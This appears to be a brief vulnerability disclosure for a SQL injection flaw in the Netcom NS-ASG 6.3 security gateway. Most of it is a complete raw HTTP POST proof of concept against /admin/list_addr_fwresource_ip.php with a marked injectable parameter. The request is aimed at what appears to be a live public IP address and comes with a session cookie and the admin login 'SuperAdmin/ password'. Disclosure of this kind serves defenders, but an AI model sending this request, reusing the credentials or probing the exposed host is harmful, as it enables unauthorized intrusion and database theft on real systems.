There is a SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official website:https://www.netentsec.com/

version:NS-ASG 6.3

Vulnerability points：/admin/list_addr_fwresource_ip.php

As follows, there is no validation during the execution of SQL injection 

<img width="664" alt="image" src="https://github.com/Wsecpro/cve1/assets/88637669/97aff80e-0c1e-4c9c-803e-61ac40c6746d">



account password：SuperAdmin/ password



Log in to the account password, construct a poc, and successfully verify that the parameters exist in SQL injection, revealing the database name

Poc：
```
POST /admin/list_addr_fwresource_ip.php HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=f30e8a16a1b6373bbc11e1ce84445033
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: https://218.75.78.54:4443
Referer: https://218.75.78.54:4443/admin/list_addr_fwresource_ip.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

ResId%5B%5D=13*&action=delete
```
<img width="678" alt="image" src="https://github.com/Wsecpro/cve1/assets/88637669/66c4dace-0806-41d2-8d9b-2e71ec51ea97">

<img width="650" alt="image" src="https://github.com/Wsecpro/cve1/assets/88637669/27934c2b-e269-4cca-961a-4e370d4e411b">





